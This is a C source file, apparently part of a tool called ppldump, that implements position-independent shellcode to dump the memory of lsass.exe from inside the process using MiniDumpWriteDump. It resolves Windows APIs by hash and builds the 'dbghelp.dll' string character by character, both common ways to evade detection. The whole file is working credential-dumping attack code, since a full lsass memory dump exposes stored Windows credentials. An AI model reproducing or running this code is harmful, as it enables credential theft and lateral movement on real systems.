/*
 * Copyright (c) 2019 Mumbai
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIEDi
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
#include <windows.h>
#include <dbghelp.h>
#include "pe_util.h"
#include "winapi.h"
#include "hashes.h"

/*!
 * MiniDumpWriteDump() Shellcode For Dumping
 * the current process address space to the
 * specified location.
 *
 * Used in: ppldump to dump lsass.exe address
 * space from within due to issues with handle
 * access.
!*/
VOID WindowsEntrypoint(LPCSTR szDumpPath)
{
  CreateFileA_t         CreateFileA         = NULL;
  GetCurrentProcess_t   GetCurrentProcess   = NULL;
  GetCurrentProcessId_t GetCurrentProcessId = NULL;
  LoadLibraryA_t        LoadLibraryA        = NULL;
  MiniDumpWriteDump_t   MiniDumpWriteDump   = NULL;

  LPVOID                Kernel32Ptr         = NULL;
  LPVOID                DbgHelpPtr          = NULL;

  HANDLE                hFile               = NULL;

  char sz_DbgHelp[]  = { 'd', 'b', 'g', 'h', 'e',
                         'l', 'p', '.', 'd', 'l',
                         'l', 0 };

  Kernel32Ptr         = GetPeBase(HASH_KERNEL32);
  LoadLibraryA        = GetPeFunc(Kernel32Ptr, HASH_LOADLIBRARYA);
  CreateFileA         = GetPeFunc(Kernel32Ptr, HASH_CREATEFILEA);
  GetCurrentProcess   = GetPeFunc(Kernel32Ptr, HASH_GETCURRENTPROCESS);
  GetCurrentProcessId = GetPeFunc(Kernel32Ptr, HASH_GETCURRENTPROCESSID);
  
  if ( LoadLibraryA(sz_DbgHelp) != NULL ) {
    DbgHelpPtr        = GetPeBase(HASH_DBGHELP);
    MiniDumpWriteDump = GetPeFunc(DbgHelpPtr, HASH_MINIDUMPWRITEDUMP); 

    hFile = CreateFileA(
	szDumpPath,
	GENERIC_READ | GENERIC_WRITE,
	FILE_SHARE_READ,
	NULL,
	CREATE_ALWAYS,
	FILE_ATTRIBUTE_NORMAL,
	NULL
    );
    MiniDumpWriteDump(
	GetCurrentProcess(),
	GetCurrentProcessId(),
	hFile,
	MiniDumpWithFullMemory,
	NULL, NULL, NULL
    );
  };
};